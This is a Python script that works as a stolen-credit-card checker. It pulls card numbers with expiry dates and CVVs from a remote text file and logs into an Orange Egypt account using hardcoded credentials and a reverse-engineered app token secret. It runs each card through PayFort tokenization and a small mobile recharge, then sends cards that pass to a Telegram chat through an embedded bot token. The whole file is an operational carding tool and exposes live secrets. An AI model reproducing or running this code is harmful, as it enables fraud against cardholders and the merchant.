import requests
import requests,hashlib
import re
import random
import telebot
import time
bot1 = telebot.TeleBot("7159559652:AAHg0s756TiP3PXWwUuCH4F1YUz5S74GlJU")
id1 = '7037898496'
egyptian_names = ["Amir", "Youssef", "Laila", "Mariam", "Omar", "Sara", "Ahmed", "Fatma", "Ali", "Nour",
                  "Mohamed", "Aya", "Khaled", "Hana", "Ibrahim", "Hadeer", "Hassan", "Reem", "Tarek", "Dina"]

url = "https://raw.githubusercontent.com/MohamedShehata86700/Doc/main/card.txt"
response = requests.get(url)
lines = response.text.splitlines()
filtered_lines = [line.strip() for line in lines if '|' in line]
for i in range(len(filtered_lines) - 1):
	c = filtered_lines[i]
	z=c.split("|")
	value=z[0]
	mon=z[1]
	if len(z[2]) >3:
		year=z[2][2:]
	else:year=z[2]
	date=year+mon
	code=z[3]
	#print(date)
	url="https://services.orange.eg/GetToken.svc/GenerateToken"
	header={
	  "Content-Type": "application/json; charset=UTF-8"
	  }
	data='{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
	
	ctv=requests.post(url,headers=header,data=data).json()["GenerateTokenResult"]["Token"]
	
	htv = hashlib.sha256((ctv+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest().upper()
	
	#print(ctv)
	#print(htv)
	
	number="01115594074"
	password="Mm86700@@"
	
	s=requests.session()
	#======================================
	urrrlll="https://services.orange.eg/SignIn.svc/SignInUser"
	
	
	hd={
	"_ctv":ctv,
	"_htv":htv,
	"Content-Type":"application/json; charset=UTF-8",
	"Content-Length":"168",
	"Host":"services.orange.eg",
	"Connection":"Keep-Alive",
	"Accept-Encoding":"gzip",
	"User-Agent":"okhttp/3.14.9"
	
	
	}
	
	
	#print(headers)
	
	
	data2='{"appVersion": "6.0.1","channel":{"ChannelName":"MobinilAndMe", "Password": "ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"'+number+'","isAndroid": "true","password":"'+password+'"}'
	
	rew=s.post(urrrlll, headers=hd, data=data2)
	#print(rew)
	
	
	userid=rew.json()["SignInUserResult"]["UserData"]["UserID"]
	#print(userid)


#import requests	
	#value = str(507808) + str(random.randint(100000000000, 999999999999))
#	month = str(random.randint(1, 12)).zfill(2)
#	year = str(random.randint(24, 30))
#	date=year+month
#	code = str(random.randint(100, 999)).zfill(3)
	vcc=f"`{value}|{date}|{code}`"
	headers = {
		'_ctv': ctv,
		'_htv': htv,
		'lang': 'ar',
		'IsEasyLogin': 'false',
		'AppVersion': '7.3.0',
		'OsVersion': '11',
		'IsAndroid': 'true',
		'net-msg-id': '464a9953020892d17117188060581059',
		'x-microservice-name': 'APMS',
		'Content-Type': 'application/json; charset=UTF-8',
		# 'Content-Length': '259',
		'Host': 'services.orange.eg',
		'Connection': 'Keep-Alive',
		# 'Accept-Encoding': 'gzip',
		'User-Agent': 'okhttp/3.14.9',
	}
	
	data = {
	  "ModuleId": 2,
	  "Amount": "36",
	  "TotalBillInPounds": "36",
	  "Currency": "EGP",
	  "Email": "www.mohamed86700@gmail.com",
	  "RememberMe": False,
	  "ChannelName": "MobinilAndMe",
	  "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
	  "Dial": number,
	  "Language": "ar",
	  "Password": password
	}
	try:
		r = s.post(
			'https://services.orange.eg/apis/gsm/gsmonlinepayment/api/Payment/GenerateMerchantReferenceForRecharge',
			headers=headers,
			json=data,
		).json()
		merchant_reference=r["Data"]["MerchantReference"]
		signature=r["Data"]["Signature"]
		access_code=r["Data"]["AccessCode"]
	except:pass		
	#print(access_code)
	#print("*"*60)
	
	urlc="https://checkout.payfort.com/FortAPI/paymentPage"
	headersc={
	"Host":"checkout.payfort.com",
	"content-length":"451",
	"cache-control":"max-age=0",
	"sec-ch-ua-mobile":"?1",
	"sec-ch-ua-platform":"Android",
	"upgrade-insecure-requests":"1",
	"user-agent":"Mozilla/5.0(Linux;Android11;RMX2061Build/RKQ1.201112.002;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/122.0.6261.120MobileSafari/537.36",
	"origin":"null",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"content-type":"application/x-www-form-urlencoded",
	"x-requested-with":"com.orange.mobinilandme",
	"sec-fetch-site":"none",
	"sec-fetch-mode":"navigate",
	"sec-fetch-user":"?1",
	"sec-fetch-dest":"document",
	"accept-encoding":"gzip,deflate,br,zstd",
	"accept-language":"ar,en-US;q=0.9,en;q=0.8",
	#"cookie":"JSESSIONID=_SCfQTjK2NoAsnUzqrRtkgljpg8yMYEtaFW174-P.ip-10-100-25-27",
	#"cookie":"cwr_u=ca90b53c-d48e-493b-bca7-280f12b9e29d"
	}
	datac={
	"card_number":value,
	"card_security_code":code,
	"expiry_date":date,
	"card_holder_name":random.choice(egyptian_names),
	"merchant_reference":merchant_reference,
	"language":"ar",
	"signature":signature,
	"access_code":access_code,
	"merchant_identifier":"tPGGAtFl",
	"service_command":"TOKENIZATION",
	"return_url":"https://services.orange.eg/apis/gsm/gsmonlinepayment/payfortresponsehandler/rechargeusingtokenization",
	}
	rc=s.post(urlc,headers=headersc,data=datac).text
	#print(rc)
	#print("*"*60)
	if   "رقم البطاقة غير صحيح" in rc:
		print("Dead Visa")
	elif  "ناجحة" in rc:
		try:
			response_code_pattern = r'response_code":"(.*?)"'
			response_code_match = re.search(response_code_pattern,rc).group(1)
			
			card_number_pattern = r'card_number":"(.*?)"'
			card_number_match = re.search(card_number_pattern,rc).group(1)
			
			card_holder_name_pattern = r'card_holder_name":"(.*?)"'
			card_holder_name_match = re.search(card_holder_name_pattern,rc).group(1)
			
			signature_pattern = r'signature":"(.*?)"'
			signature_match = re.search(signature_pattern,rc).group(1)
			
			expiry_date_pattern = r'expiry_date":"(.*?)"'
			expiry_date_match = re.search(expiry_date_pattern,rc).group(1)
			
			access_code_pattern = r'access_code":"(.*?)"'
			access_code_match = re.search(access_code_pattern,rc).group(1)
			
			merchant_reference_pattern = r'merchant_reference":"(.*?)"'
			merchant_reference_match = re.search(merchant_reference_pattern,rc).group(1)
			
			token_name_pattern = r'token_name":"(.*?)"'
			token_name_match = re.search(token_name_pattern,rc).group(1)
			
			status_pattern = r'status":"(.*?)"'
			status_match = re.search(status_pattern,rc).group(1)
			
			card_bin_pattern = r'card_bin":"(.*?)"'
			card_bin_match = re.search(card_bin_pattern,rc).group(1)
			
			urle = "https://services.orange.eg/apis/gsm/gsmonlinepayment/payfortresponsehandler/rechargeusingtokenization"
			headerse = {
				"Host": "services.orange.eg",
				"Connection": "keep-alive",
				"Content-Length": "597",
				"Cache-Control": "max-age=0",
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": "\"Android\"",
				"Upgrade-Insecure-Requests": "1",
				"Origin": "https://checkout.payfort.com",
				"Content-Type": "application/x-www-form-urlencoded",
				"User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2061 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.120 Mobile Safari/537.36",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"X-Requested-With": "com.orange.mobinilandme",
				"Sec-Fetch-Site": "cross-site",
				"Sec-Fetch-Mode": "navigate",
				"Sec-Fetch-Dest": "document",
				"Referer": "https://checkout.payfort.com/",
				"Accept-Encoding": "gzip, deflate, br, zstd",
				"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
				#"Cookie": "_hjSessionUser_1095495=eyJpZCI6IjdiMGNhMTcyLWYzZjgtNTM2Zi1iMDBhLTkzZmRhYzdmODQ5MSIsImNyZWF0ZWQiOjE3MTAxODE5NjYyMjYsImV4aXN0aW5nIjp0cnVlfQ=="
			}
			datae = {
				"response_code": response_code_match,
				"card_number": card_number_match,
				"card_holder_name": card_holder_name_match,
				"signature": signature_match,
				"merchant_identifier": "tPGGAtFl",
				"expiry_date": expiry_date_match,
				"access_code": access_code_match,
				"language": "ar",
				"response_message": "عملية ناجحة",
				"service_command": "TOKENIZATION",
				"merchant_reference": merchant_reference_match,
				"token_name": token_name_match,
				"return_url": "https://services.orange.eg/apis/gsm/gsmonlinepayment/payfortresponsehandler/rechargeusingtokenization",
				"status": status_match,
				"card_bin": card_bin_match
			}
			
			responsee = s.post(urle, headers=headerse, data=datae).text
			#print(responsee.text)
			res_pattern = r'<p>(.*?)<'
			res_match = re.search(res_pattern,responsee).group(1)
			print(res_match)
			if "Your payment was declined. Please try again later or retry using another card" in res_match:
				print("Your payment was declined")
			elif "Your payment was declined at the moment due to insufficient funds. Please refer to your issuer bank  or retry using another card" in  res_match:
				bot1.send_message(id1, vcc,parse_mode='markdownV2')
				bot1.send_message(id1, res_match,parse_mode='none')
			else:
				bot1.send_message(id1, vcc,parse_mode='markdownV2')
				bot1.send_message(id1, res_match,parse_mode='none')
		except:pass
	else:
		print("somthing Error")
print("finsh............")
